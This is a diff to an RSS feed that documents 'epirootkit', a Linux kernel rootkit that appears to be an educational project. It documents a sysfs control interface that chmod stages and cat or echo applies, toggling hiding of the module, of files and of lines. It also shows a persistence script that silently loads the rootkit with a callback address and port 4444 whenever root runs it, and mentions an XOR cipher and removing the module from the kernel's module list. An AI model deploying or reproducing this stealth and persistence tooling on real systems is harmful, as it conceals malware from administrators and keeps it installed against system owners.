@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 20:21:40 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 21:56:13 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -108,8 +108,13 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Simple two-step interface using file permissions to control rootkit features.&lt;/p>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Like git, changes require two steps:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Stage change&lt;/strong> (&lt;code>chmod&lt;/code>) - like &lt;code>git commit&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Apply change&lt;/strong> (&lt;code>cat&lt;/code>/&lt;code>echo&lt;/code>) - like &lt;code>git push&lt;/code>&lt;/li>
+&lt;/ol>
+
 
 
  
@@ -124,37 +129,144 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="5c74fd8" class="language-c ">
- &lt;code>/* Octal hide control (like file permissions)
- * 1: Module hidden 2: Files hidden 4: Lines hidden
- * Examples: 0=visible, 1=module, 3=module&amp;#43;files, 7=all hidden */
-
-static void update_hide_state(int mode)
-{
- /* Module hiding (bit 0) */
- if (mode &amp;amp; 1) {
- if (!is_module_hidden()) hide_module();
- } else {
- if (is_module_hidden()) unhide_module();
- }
- 
- /* File hiding (bit 1) */
- if (mode &amp;amp; 2) {
- if (!is_file_hiding_enabled()) enable_file_hiding();
- } else {
- if (is_file_hiding_enabled()) disable_file_hiding();
- }
- 
- /* Line hiding (bit 2) */
- if (mode &amp;amp; 4) {
- if (!is_line_hiding_enabled()) enable_line_hiding();
- } else {
- if (is_line_hiding_enabled()) disable_line_hiding();
- }
-}&lt;/code>
+ &lt;pre id="0503f93" class="language-bash ">
+ &lt;code>chmod 607 /sys/kernel/epirootkit/control # Stage features (1&amp;#43;2&amp;#43;4=7)
+cat /sys/kernel/epirootkit/control # Apply changes&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Uses 3-bit octal system (0-7) where each bit controls a stealth feature.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
+&lt;h2 id="permission-mapping">Permission Mapping &lt;a href="#permission-mapping" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Last 3 permission bits control features:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Bit 1&lt;/strong> (execute): Module hiding&lt;/li>
+&lt;li>&lt;strong>Bit 2&lt;/strong> (write): File hiding&lt;/li>
+&lt;li>&lt;strong>Bit 4&lt;/strong> (read): Line hiding&lt;/li>
+&lt;/ul>
+&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7de5cb2" class="language-bash ">
+ &lt;code># Enable all features
+chmod 607 /sys/kernel/epirootkit/control # Stage: all (7)
+cat /sys/kernel/epirootkit/control # Apply
+
+# Enable only module hiding 
+chmod 601 /sys/kernel/epirootkit/control # Stage: module (1)
+echo &amp;#34;apply&amp;#34; &amp;gt; /sys/kernel/epirootkit/control # Apply
+
+# Disable everything
+chmod 600 /sys/kernel/epirootkit/control # Stage: none (0)
+cat /sys/kernel/epirootkit/control # Apply&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="feature-combinations">Feature Combinations &lt;a href="#feature-combinations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: center">chmod&lt;/th>
+ &lt;th style="text-align: center">Bits&lt;/th>
+ &lt;th style="text-align: center">Lines&lt;/th>
+ &lt;th style="text-align: center">Files&lt;/th>
+ &lt;th style="text-align: center">Module&lt;/th>
+ &lt;th style="text-align: left">Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: center">&amp;mdash;&lt;/td>
+ &lt;td style="text-align: center">0&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">All disabled&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">&amp;ndash;x&lt;/td>
+ &lt;td style="text-align: center">1&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">-w-&lt;/td>
+ &lt;td style="text-align: center">2&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Files only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">-wx&lt;/td>
+ &lt;td style="text-align: center">3&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module + files&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">r&amp;ndash;&lt;/td>
+ &lt;td style="text-align: center">4&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Lines only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">r-x&lt;/td>
+ &lt;td style="text-align: center">5&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">rw-&lt;/td>
+ &lt;td style="text-align: center">6&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Files + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">rwx&lt;/td>
+ &lt;td style="text-align: center">7&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">All enabled&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="status-output">Status Output &lt;a href="#status-output" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="89f3e25" class="language-bash ">
+ &lt;code>cat /sys/kernel/epirootkit/control&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Example:&lt;/strong>&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -312,12 +424,12 @@ options epirootkit address=192.168.200.11 port=4444&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="3cd71fe" class="language-bash ">
+ &lt;pre id="d602ff9" class="language-bash ">
  &lt;code>#!/bin/bash
 # System environment initialization
 if [ &amp;#34;$(id -u)&amp;#34; -eq 0 ]; then
  # Check if module is already loaded via proc filesystem
- if [ ! -f /proc/epirootkit_status ] &amp;amp;&amp;amp; ! grep -q &amp;#34;^epirootkit &amp;#34; /proc/modules 2&amp;gt;/dev/null; then
+ if [ ! -f /sys/kernel/epirootkit/control ] &amp;amp;&amp;amp; ! grep -q &amp;#34;^epirootkit &amp;#34; /proc/modules 2&amp;gt;/dev/null; then
  modprobe epirootkit address=192.168.200.11 port=4444 2&amp;gt;/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2&amp;gt;/dev/null
  fi
 fi&lt;/code>
